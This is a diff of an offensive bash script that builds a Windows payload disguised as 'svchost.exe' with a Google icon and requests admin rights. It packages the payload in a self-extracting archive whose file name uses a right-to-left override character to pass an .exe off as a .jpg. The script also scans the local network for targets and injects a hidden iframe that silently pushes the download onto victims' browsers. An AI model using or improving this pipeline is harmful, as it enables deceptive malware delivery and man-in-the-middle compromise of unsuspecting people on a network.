@@ -52,6 +52,7 @@ color_print() { printf "${!1}%b${RESET}\n" "$2"; }
 rm -rf ~/.wine
 WINEARCH=win64 wineboot --init
 MITM_DIR="/tmp/mitm"
+RTLO=$(echo -e '\u202e')
 WINEPREFIX="${$HOME/.wine}"
 MSF_LOOT="$HOME/.msf4/loot"
 BUILD_DIR="$WINEPREFIX/drive_c/pyinstaller-build"
@@ -156,7 +157,7 @@ cp "$MITM_DIR/google.ico" "$BUILD_DIR/google.ico"
 wine pyinstaller --onefile --noconfirm --noconsole \
     --icon "C:\\pyinstaller-build\\google.ico" \
     --name "svchost.exe" \
-    "C:\\pyinstaller-build\\cert_installer.py"
+    --uac-admin "C:\\pyinstaller-build\\cert_installer.py"
 
 cp -r "/root/.wine/drive_c/pyinstaller-build/dist/svchost.exe" "$MITM_DIR/svchost.exe"
 
@@ -175,7 +176,7 @@ Update=U
 EOF
 
 cd "$MITM_DIR"
-rar a -sfx -z"$MITM_DIR/sfx.txt" "/var/www/html/google-update‮gpj.exe" "$MITM_DIR/svchost.exe"
+rar a -sfx -z"$MITM_DIR/sfx.txt" "/var/www/html/google-update${RTLO}gpj.exe" "$MITM_DIR/svchost.exe"
 
 # ========================
 # --- RESTART APACHE ---
@@ -194,7 +195,7 @@ TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups --plain |
 
 cat > "$MITM_DIR/hook.js" <<EOF
 const iframe = document.createElement('iframe');
-iframe.src = 'http://$LAN/google-update‮gpj.exe';
+iframe.src = 'http://$LAN/google-update${RTLO}gpj.exe';
 iframe.width = '0';
 iframe.height = '0';
 iframe.style.display = 'none';
